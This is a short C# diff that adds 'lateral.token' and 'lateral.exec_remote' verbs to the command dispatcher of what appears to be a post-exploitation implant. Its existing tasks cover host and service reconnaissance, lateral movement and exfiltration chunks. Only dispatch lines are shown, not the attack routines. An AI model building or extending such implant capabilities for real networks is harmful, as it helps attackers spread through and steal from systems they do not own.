@@ -89,6 +89,8 @@ internal sealed class Runner
             "recon.hostenum" => WithNoChunks(HostEnum(arguments)),
             "recon.service" => WithNoChunks(ServiceProbe(arguments)),
             "lateral.move" => WithNoChunks(Lateral.Move(arguments, _enroll)),
+            "lateral.token" => WithNoChunks(Lateral.Token(arguments)),
+            "lateral.exec_remote" => WithNoChunks(Lateral.ExecRemote(arguments)),
             _ => (TaskOutcome.Failed, "unknown verb: " + verb, Array.Empty<ExfilChunk>()),
         };
     }
